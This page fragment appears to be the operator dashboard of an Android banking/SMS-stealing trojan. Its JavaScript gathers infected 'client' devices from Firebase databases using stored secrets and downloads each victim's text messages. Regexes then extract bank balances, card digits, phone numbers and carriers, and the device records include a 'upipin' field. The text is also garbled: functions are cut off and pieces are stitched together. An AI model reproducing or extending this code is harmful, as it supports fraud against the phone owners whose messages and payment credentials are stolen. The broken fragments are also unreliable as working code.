                    <style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
:root{
  --bg:#070a0f; --bg-2:#0a0e17; --card:#0f1520; --card-2:#131b28;
  --border:#1e2a3a; --border-2:#2a3d55;
  --text:#f0e8d0; --text-2:#b8a080; --text-3:#7a6a50;
  --accent:#d4a017; --accent-2:#f5c842; --accent-bg:rgba(212,160,23,.08);
  --success:#10b981; --success-bg:rgba(16,185,129,.1);
  --danger:#ef4444; --danger-bg:rgba(239,68,68,.1);
  --warning:#f59e0b; --warning-bg:rgba(245,158,11,.1);
  --radius:12px; --radius-sm:8px; --radius-lg:16px;
  --shadow:0 4px 20px rgba(0,0,0,.3);
  --font-ui:'Inter',sans-serif; --font-mono:'JetBrains Mono',monospace;
}
html,body{overflow-x:hidden;background:var(--bg)}
body{color:var(--text);min-height:100vh;font-family:var(--font-ui);font-size:13.5px;line-height:1.5;-webkit-font-smoothing:antialiased}
.mono,.mono *{font-family:var(--font-mono);font-variant-numeric:tabular-nums}
button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit;font-size:inherit;transition:all .2s ease}
input,textarea,select{font-family:inherit;color:inherit;font-size:inherit}
.logo-slot{position:relative;display:flex;align-items:center;justify-content:center;background:var(--bg-2);border:1px solid var(--border);overflow:hidden;flex-shrink:0}
.logo-slot img{width:100%;height:100%;object-fit:contain;display:block}

/* GATE */
#gate{position:fixed;inset:0;z-index:9999;background:radial-gradient(ellipse at top,#1a1200 0%,var(--bg) 65%);display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto}
#gate.hidden{display:none}
.gate-card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:36px 28px;box-shadow:var(--shadow)}
.gate-brand{display:flex;align-items:center;gap:14px;padding-bottom:22px;margin-bottom:24px;border-bottom:1px solid var(--border)}
.gate-brand .logo-slot{width:52px;height:52px;border-radius:12px}
.gate-brand .name{font-size:18px;font-weight:800;background:linear-gradient(135deg,#ffffff,#f5c842,#d4a017);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:.5px}
.gate-brand .sub{font-size:11px;color:var(--text-2);margin-top:2px;font-weight:600;letter-spacing:.5px}
.gate-title{font-size:18px;font-weight:700;margin-bottom:8px}
.gate-desc{font-size:12.5px;color:var(--text-2);line-height:1.6;margin-bottom:22px}
.gate-input{width:100%;padding:15px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;color:#fff;text-align:center;letter-spacing:1px;outline:none;margin-bottom:16px;transition:border .2s;font-family:var(--font-mono)}
.gate-input:focus{border-color:var(--accent);background:var(--card)}
.gate-continue{width:100%;padding:14px;border-radius:var(--radius);background:linear-gradient(135deg,#b8860b,#f5c842);color:#000;font-size:14px;font-weight:700;letter-spacing:.5px;box-shadow:0 4px 15px rgba(212,160,23,.4)}
.gate-continue:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 6px 20px rgba(245,200,66,.6)}
.gate-continue:disabled{background:var(--card-2);color:var(--text-3);cursor:not-allowed;box-shadow:none}
.gate-error{color:var(--danger);font-size:12.5px;margin-top:12px;text-align:center;font-weight:600;display:none;background:var(--danger-bg);padding:10px;border-radius:8px;border:1px solid rgba(239,68,68,.3)}
.gate-foot{margin-top:20px;padding-top:14px;border-top:1px solid var(--border);font-size:11px;color:var(--text-3);text-align:center;letter-spacing:1px;font-weight:600}

/* APP */
.app{display:none}
.app.ready{display:block}
.topbar{display:flex;align-items:center;gap:14px;padding:14px 20px;background:rgba(11,15,26,.85);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:90;backdrop-filter:blur(14px)}
.brand{display:flex;align-items:center;gap:12px;flex-shrink:0}
.brand .logo-slot{width:38px;height:38px;border-radius:10px}
.brand-text{display:flex;flex-direction:column;line-height:1.2}
.brand-name{font-size:15px;font-weight:800;letter-spacing:.5px;color:#fff}
.brand-sub{font-size:10px;color:var(--accent);letter-spacing:1px;text-transform:uppercase;margin-top:2px;font-weight:700}
.search{flex:1;max-width:600px;position:relative}
.search input{width:100%;padding:10px 14px 10px 40px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);font-size:13px;color:var(--text);outline:none;transition:border .15s;font-weight:400}
.search input::placeholder{color:var(--text-3)}
.search input:focus{border-color:var(--accent);background:var(--card)}
.search .search-ico{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text-3);pointer-events:none;display:flex}
.icon-btn{width:38px;height:38px;border-radius:var(--radius);background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center;flex-shrink:0}
.icon-btn:hover{color:#fff;border-color:var(--border-2);background:var(--card)}

.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:16px 20px 8px}
.stat{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;min-width:0}
.stat .lbl{font-size:10.5px;color:var(--text-3);letter-spacing:.5px;text-transform:uppercase;font-weight:600;margin-bottom:6px}
.stat .val{font-family:var(--font-mono);font-size:22px;font-weight:700;letter-spacing:-.5px;line-height:1.1}
.stat.total .val{color:#a78bfa}
.stat.online .val{color:var(--success)}
.stat.offline .val{color:var(--accent-2)}
.stat.bank .val{color:var(--warning)}

.actions{display:flex;gap:10px;padding:10px 20px;border-bottom:1px solid var(--border)}
.action-btn{flex:1;padding:11px 14px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;font-weight:600;letter-spacing:.2px;color:var(--text-2);display:flex;align-items:center;justify-content:center;gap:8px}
.action-btn:hover{color:#fff;border-color:var(--border-2);background:var(--card-2)}
.action-btn .badge{background:var(--danger);color:#fff;font-family:var(--font-mono);font-size:10px;font-weight:700;padding:1px 7px;border-radius:20px;min-width:18px;text-align:center}
.action-btn .ico{display:flex;color:var(--text-3)}
.action-btn:hover .ico{color:var(--accent-2)}

.filters{display:flex;align-items:center;gap:6px;padding:10px 20px;border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none}
.filters::-webkit-scrollbar{display:none}
.filter-chip{padding:7px 14px;border-radius:20px;font-size:12px;font-weight:600;color:var(--text-2);border:1px solid transparent;white-space:nowrap;flex-shrink:0;background:transparent}
.filter-chip:hover{color:#fff;background:var(--card)}
.filter-chip.active{color:var(--accent-2);background:var(--accent-bg);border-color:rgba(59,130,246,.3);font-weight:700}
.filters .sep{width:1px;height:18px;background:var(--border);margin:0 6px;flex-shrink:0}
.filters select{padding:7px 10px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius-sm);font-size:11.5px;color:var(--text-2);outline:none;flex-shrink:0;font-weight:600}
.filters select:focus{border-color:var(--accent)}

main{display:block;padding:16px 20px 24px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}

.card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;cursor:pointer;transition:all .2s;position:relative;contain:layout style paint}
.card:hover{border-color:var(--border-2);background:var(--card-2);box-shadow:0 4px 20px rgba(0,0,0,.3)}
.card.online{border-left:3px solid var(--success)}
.card.offline{border-left:3px solid var(--border-2)}
.card.blacklisted{opacity:.5;border-style:dashed}

.card-head{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.card-head .dev-ico{width:36px;height:36px;border-radius:9px;background:var(--bg-2);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:var(--text-3)}
.card-head .dev-info{flex:1;min-width:0}
.card-head .dev-name{font-size:13.5px;font-weight:700;letter-spacing:-.1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;color:#fff}
.card-head .dev-id{font-family:var(--font-mono);font-size:10.5px;color:var(--text-3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.card-head .cbtns{display:flex;gap:2px;flex-shrink:0}
.card-head .sbtn{width:30px;height:30px;border-radius:7px;display:flex;align-items:center;justify-content:center;color:var(--text-3);background:transparent;border:1px solid transparent}
.card-head .sbtn:hover{color:#fff;background:var(--bg-2);border-color:var(--border)}
.card-head .sbtn.starred{color:var(--warning);background:var(--warning-bg)}

.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 14px;margin-bottom:12px}
.kv .k{font-size:10.5px;font-weight:600;color:var(--text-3);letter-spacing:.5px;text-transform:uppercase;margin-bottom:5px}
.kv .v{font-size:12.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:var(--text)}
.kv .v.mono{font-family:var(--font-mono);font-size:11.5px;color:#fff}
.kv .v.muted{color:var(--text-3);font-weight:500}
.kv .v.fetching{color:var(--accent);font-weight:600;font-size:11.5px;font-style:italic;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}

.battery{display:flex;align-items:center;gap:7px;font-size:12.5px;font-weight:700;font-family:var(--font-mono)}
.battery .ico{width:22px;height:11px;border:1.5px solid currentColor;border-radius:2.5px;position:relative;padding:1px}
.battery .ico::after{content:"";position:absolute;right:-3px;top:50%;transform:translateY(-50%);width:2px;height:5px;background:currentColor;border-radius:0 2px 2px 0}
.battery .ico .fill{height:100%;border-radius:1.5px;background:currentColor}

.bank-box{background:var(--bg-2);border:1px solid var(--border);border-radius:9px;padding:11px 12px;margin-bottom:12px}
.bank-box .row1{display:flex;justify-content:space-between;align-items:center;gap:10px}
.bank-box .bank{display:flex;align-items:center;gap:8px;min-width:0}
.bank-box .bank-logo{width:20px;height:20px;border-radius:50%;background:var(--warning);color:#000;font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.bank-box .bank-name{font-size:11.5px;font-weight:700;color:var(--warning);letter-spacing:.1px}
.bank-box .bank-acc{font-family:var(--font-mono);font-size:10.5px;color:var(--text-3)}
.bank-box .bank-amt{font-family:var(--font-mono);font-size:13px;font-weight:700;flex-shrink:0;color:#fff}
.bank-box .txn{margin-top:6px;font-size:11px;font-weight:600;font-family:var(--font-mono);display:flex;align-items:center;gap:4px}
.bank-box .txn.credit{color:var(--success)}
.bank-box .txn.debit{color:var(--danger)}

.card-foot{display:flex;align-items:center;gap:7px;padding-top:9px;border-top:1px solid var(--border);font-size:11.5px;font-weight:600}
.card-foot .dot{width:7px;height:7px;border-radius:50%;background:var(--border-2);flex-shrink:0}
.card-foot.online .dot{background:var(--success);box-shadow:0 0 6px var(--success)}
.card-foot.online .lbl{color:var(--success)}
.card-foot.offline .dot{background:var(--text-3)}
.card-foot.offline .lbl{color:var(--text-2)}
.card-foot .right{margin-left:auto;font-size:10.5px;color:var(--text-3);font-family:var(--font-mono)}

.empty{text-align:center;padding:70px 20px;color:var(--text-3)}
.empty .t{font-size:14px;font-weight:700;color:var(--text-2);margin-bottom:8px}
.empty .s{font-size:12px;color:var(--text-3)}
.spinner{width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}

.foot{padding:16px 20px;text-align:center;font-size:11px;color:var(--text-3);letter-spacing:.5px;font-weight:600;border-top:1px solid var(--border);background:var(--bg-2)}

/* DETAIL */
.d-overlay{position:fixed;inset:0;z-index:1000;background:rgba(4,6,12,.7);backdrop-filter:blur(4px);display:flex;justify-content:flex-end;animation:fadeIn .18s}
.d-panel{width:100%;max-width:480px;background:var(--bg);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;animation:slideIn .22s ease-out}
@keyframes slideIn{from{transform:translateX(24px);opacity:0}to{transform:translateX(0);opacity:1}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.d-head{padding:14px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;background:var(--card);flex-shrink:0}
.d-head .info{flex:1;min-width:0}
.d-head .name{font-size:14px;font-weight:700;letter-spacing:-.1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff}
.d-head .meta{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--text-2);margin-top:3px;font-weight:600}
.d-head .meta .dot{width:7px;height:7px;border-radius:50%;background:var(--text-3)}
.d-head .meta .dot.on{background:var(--success)}
.d-head .close{width:32px;height:32px;border-radius:7px;background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center}
.d-head .close:hover{color:#fff;border-color:var(--border-2)}
.d-tabs{display:flex;background:var(--card);border-bottom:1px solid var(--border);padding:0 14px;overflow-x:auto;flex-shrink:0;scrollbar-width:none}
.d-tabs::-webkit-scrollbar{display:none}
.d-tabs button{padding:12px 14px;font-size:12px;font-weight:700;letter-spacing:.2px;color:var(--text-3);border-bottom:2px solid transparent;white-space:nowrap;text-transform:uppercase}
.d-tabs button:hover{color:var(--text-2)}
.d-tabs button.active{color:var(--accent-2);border-bottom-color:var(--accent)}
.d-content{flex:1;overflow-y:auto;padding:18px}
.d-content::-webkit-scrollbar{width:6px}
.d-content::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

.section{font-size:10.5px;font-weight:800;color:var(--text-3);letter-spacing:1.5px;text-transform:uppercase;margin:20px 0 10px;display:flex;align-items:center;gap:10px}
.section::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent)}
.section:first-child{margin-top:0}

.irow{display:flex;justify-content:space-between;padding:10px 0;gap:14px;border-bottom:1px solid var(--border);font-size:12.5px}
.irow:last-child{border-bottom:none}
.irow .l{color:var(--text-3);font-weight:600;flex-shrink:0}
.irow .v{color:#fff;font-weight:700;text-align:right;word-break:break-word;max-width:65%}
.irow .v.mono{font-family:var(--font-mono);font-size:11.5px}
.irow .v.hi{color:var(--accent-2)}

.sms-item{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px;margin-bottom:10px;font-size:12px}
.sms-item .head{display:flex;justify-content:space-between;font-size:11.5px;font-weight:700;color:var(--accent-2);margin-bottom:6px;gap:10px}
.sms-item .head .time{color:var(--text-3);font-weight:600;font-family:var(--font-mono);flex-shrink:0;font-size:10.5px}
.sms-item .body{color:var(--text-2);line-height:1.55;word-break:break-word;font-weight:500}
.sms-item .from{font-size:10.5px;color:var(--text-3);margin-bottom:6px;font-weight:600;font-family:var(--font-mono)}
.sms-item.brand-match{border-left:3px solid var(--danger)}

.bank-item{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--warning);border-radius:10px;padding:12px;margin-bottom:10px}
.bank-item .row1{display:flex;justify-content:space-between;align-items:center;gap:10px}
.bank-item .nm{font-size:12.5px;font-weight:700;color:var(--warning)}
.bank-item .amt{font-family:var(--font-mono);font-size:13px;font-weight:700;color:#fff}
.bank-item .raw{font-family:var(--font-mono);font-size:10.5px;color:var(--text-3);margin-top:6px;line-height:1.5;word-break:break-word}

.form{display:flex;flex-direction:column;gap:14px}
.form .lbl{font-size:10.5px;font-weight:800;color:var(--text-3);letter-spacing:.5px;text-transform:uppercase}
.sim-row{display:flex;gap:8px}
.sim-row button{flex:1;padding:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:8px;font-size:12px;font-weight:700;color:var(--text-2)}
.sim-row button:hover{border-color:var(--border-2)}
.sim-row button.active{background:var(--accent-bg);color:var(--accent-2);border-color:var(--accent)}
.form input,.form textarea{background:var(--bg-2);border:1px solid var(--border);border-radius:8px;padding:11px 12px;font-size:12.5px;color:var(--text);outline:none;width:100%;transition:border .15s}
.form input:focus,.form textarea:focus{border-color:var(--accent);background:var(--card)}
.form textarea{resize:vertical;min-height:90px;line-height:1.55}
.btn-primary{padding:12px;border-radius:8px;background:var(--accent);color:#fff;font-size:12.5px;font-weight:700;letter-spacing:.2px}
.btn-primary:hover:not(:disabled){background:var(--accent-2)}
.btn-primary:disabled{opacity:.5;cursor:not-allowed}

/* MODAL */
.modal-overlay{position:fixed;inset:0;z-index:2000;background:rgba(4,6,12,.8);backdrop-filter:blur(4px);display:flex;align-items:center;justify-content:center;padding:16px;animation:fadeIn .15s}
.modal{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);width:100%;max-width:560px;max-height:90vh;overflow-y:auto;padding:22px}
.modal.wide{max-width:680px}
.modal::-webkit-scrollbar{width:6px}
.modal::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.modal-head{display:flex;align-items:center;justify-content:space-between;padding-bottom:14px;margin-bottom:16px;border-bottom:1px solid var(--border)}
.modal-head h2{font-size:14.5px;font-weight:700;letter-spacing:-.1px}
.modal-head .close{width:30px;height:30px;border-radius:7px;background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center}
.modal-head .close:hover{color:#fff;border-color:var(--border-2)}

.confirm-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius-lg);padding:22px;max-width:340px;width:100%;text-align:center;animation:popIn .18s ease-out}
@keyframes popIn{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
.confirm-box .title{font-size:14px;font-weight:700;margin-bottom:8px;color:#fff}
.confirm-box .desc{font-size:12.5px;color:var(--text-2);line-height:1.55;margin-bottom:20px}
.confirm-box .desc b{color:var(--accent-2);font-weight:700;font-family:var(--font-mono);font-size:11.5px}
.confirm-actions{display:flex;gap:8px}
.confirm-actions button{flex:1;padding:10px;border-radius:8px;font-size:12px;font-weight:700;letter-spacing:.2px}
.confirm-actions .cancel{background:var(--bg-2);border:1px solid var(--border);color:var(--text-2)}
.confirm-actions .cancel:hover{color:#fff;border-color:var(--border-2)}
.confirm-actions .ok{background:var(--danger);color:#fff}
.confirm-actions .ok.restore{background:var(--success)}
.confirm-actions .ok:hover{opacity:.9}

.toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--card);border:1px solid var(--border);color:var(--text);padding:11px 20px;border-radius:22px;font-size:12.5px;font-weight:600;z-index:5000;transition:transform .22s ease;max-width:90%;text-align:center;pointer-events:none;box-shadow:var(--shadow)}
.toast.show{transform:translateX(-50%) translateY(0)}
.toast.ok{background:var(--success);border-color:var(--success);color:#fff}
.toast.err{background:var(--danger);border-color:var(--danger);color:#fff}
.toast.warn{background:var(--warning);border-color:var(--warning);color:#0b0f1a}

/* ALL SMS */
.sms-toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap;padding:10px 0;margin-bottom:8px;border-bottom:1px solid var(--border);position:sticky;top:-22px;background:var(--bg);z-index:5}
.sms-toolbar .count{flex:1;font-size:11.5px;color:var(--text-2);font-weight:600;letter-spacing:.2px;font-family:var(--font-mono);min-width:100px}
.sms-toolbar .live{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--success);margin-right:6px;vertical-align:middle;animation:livePulse 1.6s ease-in-out infinite}
@keyframes livePulse{0%,100%{opacity:1}50%{opacity:.4}}
.sms-toolbar .chip{padding:6px 12px;border-radius:20px;background:var(--bg-2);border:1px solid var(--border);font-size:11px;font-weight:700;color:var(--text-2);letter-spacing:.3px;text-transform:uppercase}
.sms-toolbar .chip:hover{color:#fff;border-color:var(--border-2)}
.sms-toolbar .chip.active{background:var(--accent-bg);color:var(--accent-2);border-color:var(--accent)}
.sms-progress{display:none;margin-bottom:10px}
.sms-progress.show{display:block}
.sms-progress .bar{height:3px;background:var(--border);border-radius:2px;overflow:hidden}
.sms-progress .bar > div{height:100%;background:var(--accent);width:0%;transition:width .3s ease}
.sms-progress .lbl{font-size:10.5px;color:var(--text-3);margin-top:5px;letter-spacing:.3px;text-align:center;font-family:var(--font-mono)}
.sms-list{max-height:60vh;overflow-y:auto;padding-right:4px}
.sms-list::-webkit-scrollbar{width:6px}
.sms-list::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
.sms-date{display:flex;align-items:center;gap:10px;font-size:10.5px;font-weight:800;color:var(--text-3);letter-spacing:.5px;text-transform:uppercase;margin:14px 0 8px}
.sms-date::before,.sms-date::after{content:"";flex:1;height:1px;background:var(--border)}
.sms-foot{text-align:center;padding:14px 0 4px;font-size:11px;color:var(--text-3);font-weight:600;letter-spacing:.3px;border-top:1px solid var(--border);margin-top:14px}
.sms-foot b{color:var(--accent-2);font-weight:700;font-family:var(--font-mono)}

@media (max-width:640px){
  .topbar{padding:12px 16px;gap:10px;flex-wrap:wrap}
  .search{order:3;flex-basis:100%;max-width:none}
  .stats{padding:12px 16px 8px;gap:8px}
  .stat{padding:11px 13px}
  .stat .val{font-size:18px}
  .actions{padding:8px 16px;gap:8px}
  .action-btn{padding:10px;font-size:11.5px}
  .filters{padding:8px 16px}
  main{padding:12px 16px 20px}
  .grid{grid-template-columns:1fr;gap:10px}
  .card{padding:14px}
  .d-panel{max-width:100%}
  .modal{padding:18px;border-radius:12px}
  .gate-card{padding:26px 22px}
}
</style>
                  </head>
                  <body>
                    <div id="gate">
                      <div class="gate-card">

function esc(s){ if(s===null||s===undefined) return ''; return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function toast(msg, type){
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast ' + (type||'');
  requestAnimationFrame(()=>t.classList.add('show'));
  clearTimeout(t._t);
  t._t = setTimeout(()=>t.classList.remove('show'), 2500);
}
function parseTimestamp(val, key){
  if(typeof val === 'number' && isFinite(val)){ if(val>1e12) return val; if(val>1e9) return val*1000; return val; }
  if(typeof val === 'string' && val.trim()){
    const s = val.trim();
    if(/^\d+$/.test(s)){ const n=parseInt(s,10); if(n>1e12) return n; if(n>1e9) return n*1000; return n; }
    const d = new Date(s); if(!isNaN(d.getTime())) return d.getTime();
    const m = s.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{2,4})/);
    if(m){ let y=parseInt(m[3],10); if(y<100) y+=2000; const dt=new Date(y,parseInt(m[2],10)-1,parseInt(m[1],10)); if(!isNaN(dt.getTime())) return dt.getTime(); }
  }
  if(key){ const kn=parseInt(key,10); if(!isNaN(kn) && isFinite(kn)) return kn; }
  return 0;
}
function fmtTime(ts){ if(!ts) return ''; const d=new Date(ts); if(isNaN(d.getTime())) return ''; return d.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true}); }
function fmtDate(ts){
  if(!ts) return 'Unknown';
  const d = new Date(ts); if(isNaN(d.getTime())) return 'Unknown';
  const now = new Date();
  const today = new Date(now.getFullYear(),now.getMonth(),now.getDate());
  const yest = new Date(today); yest.setDate(yest.getDate()-1);
  const day = new Date(d.getFullYear(),d.getMonth(),d.getDate());
  if(day.getTime()===today.getTime()) return 'Today · '+d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
  if(day.getTime()===yest.getTime()) return 'Yesterday · '+d.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
  return d.toLocaleDateString('en-IN',{weekday:'long',day:'2-digit',month:'short',year:'numeric'});
}

async function fetchSmsRaw(id, url, sec, signal){
  if(!url||!sec) return [];
  const full = `${url}/messages/${id}.json?auth=${encodeURIComponent(sec)}&orderBy="$key"&limitToLast=1000`;
  try{
    const r = await fetch(full, signal?{signal}:undefined);
    if(!r.ok) return [];
    const d = await r.json();
    if(!d||typeof d!=='object') return [];
    const list = [];
    for(const key in d){
      const m = d[key];
      if(!m||typeof m!=='object') continue;
      const text = m.message||m.text||m.body;
      if(!text) continue;
      const tsVal = m.dateTime||m.date||m.timestamp||m.time||0;
      const ts = parseTimestamp(tsVal, key);
      let dispTime='';
      if(m.dateTime) dispTime=String(m.dateTime);
      else if(m.date) dispTime=String(m.date);
      else if(m.timestamp) dispTime=String(m.timestamp);
      else if(m.time) dispTime=String(m.time);
      else if(ts>0){ try{ dispTime=new Date(ts).toLocaleString('en-IN',{hour:'2-digit',minute:'2-digit',hour12:true,day:'2-digit',month:'short'}); }catch(e){} }
      list.push({text:String(text), sender:m.sender||m.from||m.address||'Unknown', time:dispTime, _ts:ts, _key:key});
    }
    list.sort((a,b)=>(b._ts!==a._ts)?b._ts-a._ts:String(b._key).localeCompare(String(a._key)));
    return list;
  }catch(e){ if(e.name==='AbortError') throw e; return []; }
}
const PHONE_RE_SMS = /(?:\+91[\s-]?)?([6-9]\d{9})\b/;
function extractPhoneFromSmsText(text){ if(!text) return null; const m=text.match(PHONE_RE_SMS); return m?m[1]:null; }

function analyzeSms(msgs){
  const bank=[],cards=[],phones=[],nets=[];
  for(const msg of msgs){
    const t = msg.text || '';
    const bm = t.match(/(?:Avl|Bal|Available)\s*(?:Bal|Balance)?\s*[:\-]?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i)
      || t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:Avl|Bal|Balance)/i);
    if(bm){
      const bn = t.match(/HDFC|SBI|ICICI|AXIS|KOTAK|PNB|BOI|CANARA|UNION|YES|IDBI|INDUS|FEDERAL|RBL|PAYTM|PHONEPE|GPAY|IPBMSG/i);
      const txType = /credit/i.test(t)?'credit':(/debit|withdraw|spent|purchase/i.test(t)?'debit':'');
      let txAmt='';
      const am = t.match(/(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s*(?:debited|credited|withdrawn|deposited|spent)/i)
        || t.match(/(?:debited|credited|withdrawn|deposited|spent)\s*(?:by|with|for)?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i);
      if(am) txAmt = am[1].replace(/,/g,'');
      const accM = t.match(/([xX*]{0,4}[0-9]{4})\b/);
      bank.push({bankName:bn?bn[0]:'Bank', availableBalance:bm[1].replace(/,/g,''), accountLast4:accM?accM[1].slice(-4):'', transactionType:txType, transactionAmount:txAmt, rawSms:t.substring(0,140)});
    }
    const cm = t.match(/card[\s:]*([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i) || t.match(/[xX*]{4,}([0-9]{4})/);
    if(cm){ const ct=t.match(/VISA|MASTER|RUPAY|AMEX/i); cards.push({cardLast4:cm[1].replace(/\s/g,'').slice(-4), cardType:ct?ct[0]:'Card'}); }
    const pm = t.match(PHONE_RE_SMS);
    if(pm){ const num=pm[1]; if(num&&num.length===10&&/^[6-9]/.test(num)&&phones.indexOf(num)===-1) phones.push(num); }
    const nm = t.match(/Jio|Airtel|Vodafone|Idea|BSNL|Vi/i);
    if(nm && nets.indexOf(nm[0])===-1) nets.push(nm[0]);
  }
  return {bankBalances:bank, cards:cards, phoneNumbers:phones, networks:nets};
}

function applyFilters(list){

    if(currentFilter==='offline' && d.status) return false;

    if(searchQ){
      const q = searchQ.toLowerCase();
      const hit = (d.name && d.name.toLowerCase().includes(q))

        || (d.mobNo && d.mobNo.includes(q))
        || (d._srcTag && d._srcTag.toLowerCase().includes(q));
      if(!hit) return false;
    }
    return true;
  }).sort((a,b)=>{
    if(currentSort==='newest') return (b.id||'').localeCompare(a.id||'');
    if(currentSort==='oldest') return (a.id||'').localeCompare(b.id||'');
    if(currentSort==='name') return (a.name||'').localeCompare(b.name||'');
    if(currentSort==='battery') return parseBat(b.battery).p - parseBat(a.battery).p;
    return 0;
  });
}

function updateCardInDom(dev){

    const cells = c.querySelectorAll('.card-grid .kv');
    if(cells.length>=4){

      const phoneEl = cells[2].querySelector('.v');

        phoneEl.textContent = phone||'—';

      const nets = (dev.sms && dev.sms.networks) || [];
      const net = dev.network || (nets.length>0 ? nets[0] : null);

      if(netEl && netEl.textContent !== (net||'—')){

    }
    return;

// ============ FETCH ============
async function fetchAll(silent){
  if(fetchInProgress) return;
  const root = document.getElementById('sectionsRoot');
  if(!sources || sources.length===0){
    root.innerHTML = '<div class="empty"><div class="t">No Sources</div><div class="s">Admin panel me Firebase URL add karein</div></div>';
    return;
  }
  fetchInProgress = true;
  if(!silent && devices.length===0){
    root.innerHTML = '<div class="empty"><div class="spinner"></div><div class="t">Loading devices…</div></div>';
  }

  const all = [];
  const bs = 20;
  for(let i=0; i<sources.length; i+=bs){
    const batch = sources.slice(i, i+bs);
    const promises = batch.map(async src=>{
      const url = `${src.url}/clients.json?auth=${encodeURIComponent(src.secret)}`;
      try{
        const r = await fetch(url);
        if(!r.ok) throw new Error('HTTP '+r.status);
        const d = await r.json();
        return {src, data:d};
      }catch(e){ return {src, error:e.message}; }
    });
    const settled = await Promise.all(promises);
    for(const v of settled){
      if(v.error || !v.data || typeof v.data !== 'object') continue;
      for(const [id, dev] of Object.entries(v.data)){
        if(typeof dev !== 'object' || dev === null) continue;
        const sims = dev.sims || [];
        const nodePhone = extractPhoneFromNode(dev, sims);
        const nodeNetwork = extractNetworkFromNode(dev, sims);
        all.push({
          id, _srcId:v.src.id, _srcUrl:v.src.url, _srcSec:v.src.secret, _srcTag:v.src.tag,
          name: dev.modelName||dev.model||dev.deviceName||dev.name||id,
          androidV: dev.androidV||dev.androidVersion||dev.sdkV||'—',
          battery: dev.battery||dev.batteryLevel||dev.battery_percent||'—',
          status: dev.status===true||dev.status==='true'||dev.status===1||dev.status==='online',
          mobNo: nodePhone||'—', network: nodeNetwork||null, sims,
          sms: dev.smsAnalysis||dev.analysis||{},
          lastSeen: dev.lastSeen||dev.last_seen||dev.timestamp||dev.updatedAt||dev.updated_at||null,
          upipin: dev.upipin||null, ip: dev.ip_address||dev.ip||'—',
          storage: dev.storage||'—', cpu: dev.cpu_arch||'—', sdk: dev.sdkV||'—'
        });
      }
    }
  }

  for(const d of all){
    const cached = phoneCache[cacheKey(d)];
    if(cached){
      if(cached.phone && (!d.mobNo || d.mobNo==='—')) d.mobNo = cached.phone;
      if(cached.network && !d.network) d.network = cached.network;
    }
  }

  devices = all;
  updateStats();
  renderSections();
  updateAllSmsBadge();
  updateStarredBadge();
  fetchInProgress = false;
  enrichBackground();
}

async function enrichBackground(){
  if(enrichRunning) return;
  enrichRunning = true;

